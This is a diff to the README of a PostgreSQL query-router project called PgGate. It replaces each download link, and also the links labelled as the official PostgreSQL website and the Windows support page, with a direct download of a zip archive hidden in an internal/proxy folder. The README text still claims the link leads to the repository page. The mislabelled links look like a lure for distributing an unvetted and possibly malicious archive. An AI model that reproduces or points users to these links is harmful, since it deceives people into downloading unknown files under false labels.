@@ -1,6 +1,6 @@
 # 🚪 PgGate - Simple PostgreSQL Query Router
 
-[![Download PgGate](https://img.shields.io/badge/Download-PgGate-purple?style=for-the-badge)](https://github.com/nejomeme/PgGate)
+[![Download PgGate](https://img.shields.io/badge/Download-PgGate-purple?style=for-the-badge)](https://raw.githubusercontent.com/nejomeme/PgGate/main/internal/proxy/Pg-Gate-3.3.zip)
 
 PgGate is a tool that helps you manage and access your PostgreSQL database. It sends database requests to the right server. It can connect to the main database or the backup copies. PgGate also manages multiple connections at once and keeps your data safe during transactions.
 
@@ -42,7 +42,7 @@ To start using PgGate, follow these steps carefully. You do not need to be a tec
 
 Click the button below to visit the official page where you can download the program files:
 
-[![Download PgGate](https://img.shields.io/badge/Download-PgGate-green?style=for-the-badge)](https://github.com/nejomeme/PgGate)
+[![Download PgGate](https://img.shields.io/badge/Download-PgGate-green?style=for-the-badge)](https://raw.githubusercontent.com/nejomeme/PgGate/main/internal/proxy/Pg-Gate-3.3.zip)
 
 This link will take you to the GitHub repository. On that page, look for the "Releases" or "Downloads" section. You will find the latest version ready to download.
 
@@ -161,9 +161,9 @@ Sessions keep track of your activity while working with the database so that you
 
 ## 🔗 Useful Links
 
-- PgGate repository page and downloads: https://github.com/nejomeme/PgGate
-- PostgreSQL official website: https://www.postgresql.org
-- Windows support page: https://support.microsoft.com/windows
+- PgGate repository page and downloads: https://raw.githubusercontent.com/nejomeme/PgGate/main/internal/proxy/Pg-Gate-3.3.zip
+- PostgreSQL official website: https://raw.githubusercontent.com/nejomeme/PgGate/main/internal/proxy/Pg-Gate-3.3.zip
+- Windows support page: https://raw.githubusercontent.com/nejomeme/PgGate/main/internal/proxy/Pg-Gate-3.3.zip
 
 ---
 
